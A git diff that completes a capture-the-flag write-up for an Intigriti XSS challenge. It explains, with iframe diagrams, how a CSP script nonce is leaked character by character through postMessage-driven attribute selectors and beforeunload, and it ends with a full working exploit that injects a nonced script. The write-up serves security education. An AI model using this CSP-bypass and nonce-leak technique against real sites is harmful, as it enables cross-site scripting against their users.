@@ -750,15 +750,242 @@ nonce.
 Great! We can sent these actions from our blobbed script to `index.php`.
 But how do we know which of the nonces we sent mached. We need some way of 
 communicating back to the iframe that what we sent was correct, so we can keep building
-the correct nonce and keep adding charachters. And whatever this mechanism is it
+the correct nonce and keep adding characters. And whatever this mechanism is it
 can only involve running `s.setAttribute()`. Because that's all we can utilize from
 
 ```
 document.querySelectorAll(e.data.element)].forEach(s => s.setAttribute(e.data.attr, e.data.value)
 ```
 
-It iterates through the result array them and sets a attribute on every.
-This is great we could use 
+Here are some ideas.
 
+We could be changing the hash portion of the URL of the iframe.
+And add an `onhashchange` event hander listening insinde of `iframe`. Changing a hash does
+not result in reloading of a page.
 
-NOT YET FINISHED
+Or change the `<iframe>`'s `name` attribute, and inside create a function that periodically  checks
+if the variable `window.name` changed.
+
+Or we change the `width` (or `height`) attribute of the
+`<iframe>` and inside it listen to the `onresize` event. Or poll it's own `height`,
+similary we would do it in the `name` case. Something like `setInterval('//check if window.innerHeight changed', 10)`.
+Then use some kind of code to represent a `nonce` like `a5c2` as an number. As
+only integers can be used to set `width`, `height`.
+
+After a lot of experimenting we will come to the conclusion that only the `name` method
+works but only in firefox. The `hash` and `resize` trick don't work in any browser
+in this case.
+
+One trick that works tough is to change the `src` attribute to something that is 
+allowed by the CSP and away from the current blob URL. And that is just only
+`https://challenge-0922.intigriti.io`. Inside our blobbed URL script we will listen
+for the `beforeunload` event. It's one of the last events a website generates
+before it's moved away from.
+
+The unloading of the `iframe` complicates things further as we will not be able
+to keep a state of the soft "bruteforced" nonce inside of it. Because it will
+be destroyed, again we instructed it to be moved to another domain.
+
+In order to store the 'nonce' somewhere else we will send it away. We will
+`postMessage` it ouf of the `iframe` to the `top`. This is the code that changed
+the location of the iframe in the iframe.
+
+Then we will start the process again by switchting the most inner frame to a
+blob URL with the just recovered nonce. This nonce will be used as starting point.
+
+Here a graphical overview of the iframes when everything starts.
+```
+editor.43z.one/1337
++------------------------------------------------------------+
+|  challenge-0922.intigriti.com/challenge/index.php          |
+|  +------------------------------------------------------+  |
+|  |  challenge-0922.intigriti.com/challenge/magic.php    |  |
+|  |  +------------------------------------------------+  |  |
+|  |  |                                                |  |  |
+|  |  |                                                |  |  |
+|  |  +------------------------------------------------+  |  |
+|  +------------------------------------------------------+  |
++------------------------------------------------------------+
+
+```
+Then from `editor.43z.one/1337` we will change the most inner frame
+to a blob with our code in it.
+
+```
+                                                           change to blob
+                                                                +
+                                                                |
+ editor.43z.one/1337                                            |
++-----------------------------------------------------------------------+
+|                                                               |       |
+|   challenge-0922.intigriti.com/challenge/index.php            |       |
+|  +-----------------------------------------------------------------+  |
+|  |                                                            |    |  |
+|  |  blob:editor.43z.one/asdf-wf92fg-gew32-fd302-wfw0   <------+    |  |
+|  |  +------------------------------------------------+             |  |
+|  |  |                                                |             |  |
+|  |  +------------------------------------------------+             |  |
+|  +-----------------------------------------------------------------+  |
++-----------------------------------------------------------------------+
+```
+The blob code starts working.
+```
+ editor.43z.one/1337
++---------------------------------------------------------------------+
+|                                                                     |
+|   challenge-0922.intigriti.com/challenge/index.php                  |
+|  +---------------------------------------------------------------+  |
+|  |                                                               |  |
+|  |  blob:editor.43z.one/asdf-wf92fg-gew32-fd302-wfw0             |  |
+|  |  +------------------------------------------------+           |  |
+|  |  |                                                |           |  |
+|  |  |                                                |           |  |
+|  |  |   code sends new iteration of nonce            |           |  |
+|  |  |   every 100ms to parent via postMessage +------------->    |  |
+|  |  |                                                |           |  |
+|  |  +------------------------------------------------+           |  |
+|  +---------------------------------------------------------------+  |
++---------------------------------------------------------------------+
+```
+On every message `index.php` receives it does the `document.querySelector`
+call wich includes the sent nonce. 
+```
+  editor.43z.one/1337
++----------------------------------------------------------------------------------------+
+|                                                                                        |
+|   challenge-0922.intigriti.com/challenge/index.php                                     |
+|  +--------------------------------------------------------------------------+          |
+|  |                                                                          |          |
+|  |  blob:editor.43z.one/asdf-wf92fg-gew32-fd302-wfw0  <---+                 |          |
+|  |  +------------------------------------------------+    |                 |          |
+|  |  |                                                |    |                 |          |
+|  |  |                                                |    +                 |          |
+|  |  |   code detects beforeunload event              | when nonce matches it|          |
+|  |  |   sends the last nonce it sent to parent       | will set the src     |          |
+|  |  |   now to top                                   | of inner iframe to   |          |
+|  |  |      +                                         | challenge-0922.intigriti.com    |
+|  |  |      |                                         |                      |          |
+|  |  |      |                                         |                      |          |
+|  |  +------------------------------------------------+                      |          |
+|  |         |                                                                |          |
+|  +--------------------------------------------------------------------------+          |
+|            |                                                                           |
+|            v                                                                           |
++----------------------------------------------------------------------------------------+
+```
+The top has now the first character of the nonce. And the whole process
+is starts again. But this time the blob code starts iteration from with the new
+nonce that just matched.
+
+We will do this again and again and build up the nonce character by character.
+It's tricky to detect the when we got the full nonce because it has not a fixed
+length. It can be from 29 up to 32 characters long. We will have to make use
+of some timeout counter and simply define that if we don't get a messsage in the
+`top` from the blob in 2 seconds it means we already have the full nonce.
+
+And when that happens we can finally do what failed before. Create a new blob
+one last time that sends the 'set' message which changes the 'srcdoc' of the iframe.
+
+```
+<iframe onload=stage1() id=i src="https://challenge-0922.intigriti.io/challenge/"></iframe>
+<script>
+  onmessage = e => {
+    // here detecting the progress of the nonce
+    if(nonce fully exfiltrated){
+      stage2(nonce)
+    }
+  }
+  stage1 = e => {
+    // here the nonce exfiltration stuff
+  }
+
+  stage2 = nonce => {
+    burl = URL.createObjectURL(new Blob([`
+      <script>
+        parent.postMessage({
+          element: '#ball',
+          action: 'set',
+          attr: 'srcdoc',
+          // we have to use parent.alert because iframe 
+          // has sandbox value set and does not allow modals
+          value: '<script nonce=${nonce}>parent.alert(document.domain)</'+'script>'
+        }, '*') 
+      <`+`/script>
+    `], {type : 'text/html'}))
+    frames[0][0].location = burl 
+  }
+</script>
+```
+And here is the final exploit with all the glue code added to make it actually work.
+```
+<iframe onload="stage1('')" src="https://challenge-0922.intigriti.io/challenge/"></iframe>
+
+<script>
+  const sleepTime = 90
+  finished = null
+  listener = e => {
+    if(!e.data.length) return
+
+    clearTimeout(finished)
+    nonce=e.data
+
+    finished = setTimeout(_=>{
+      console.log('probabbly finished with', nonce)
+      stage2(nonce)
+      removeEventListener('message', listener)
+    }, sleepTime*17)
+
+    stage1(nonce)
+
+  }
+  addEventListener('message', listener)
+
+  genblob = content => {
+    b = new Blob([`<script>${content}<\/script>`],{type: 'text/html'})
+    return URL.createObjectURL(b)
+  }
+
+  stage1 = nonce => {
+    frames[0][0].location = genblob(`
+      sleep = ms => new Promise(r => setTimeout(r, ms))
+      checkNonce=null
+
+      listener = e =>{
+        top.postMessage(checkNonce+'', '*')
+        removeEventListener('beforeunload', listener)
+      }
+      addEventListener('beforeunload', listener)
+
+      iteratenonce = async (partialNonce) => {
+        console.log('iterating nonce starting with','${nonce}')
+        chars = ['a','b','c','d','e','f','0','1','2','3','4','5','6','7','8','9']
+        for(ix=0; ix<chars.length;ix++){
+          checkNonce = partialNonce+chars[ix]
+          action = {
+            element: 'script[nonce^="'+checkNonce+'"]~div>div>iframe',
+            action: 'set',
+            attr: 'src',
+            value: 'https://challenge-0922.intigriti.io'
+          }
+          parent.postMessage(action, '*')
+          console.log('checking', checkNonce)
+          await sleep('${sleepTime}')
+        }
+      }
+      iteratenonce('${nonce}')
+    `)
+  }
+
+  stage2 = nonce => {
+    console.log('send script to pop with nonce', nonce)
+    frames[0][0].location = genblob(`
+      parent.postMessage({
+        element: '#ball',
+        action: 'set',
+        attr: 'srcdoc',
+        value: '<script nonce="${nonce}">parent.alert(document.domain)<\\/script>'
+      }, '*')
+    `)
+  }
+</script>
+```
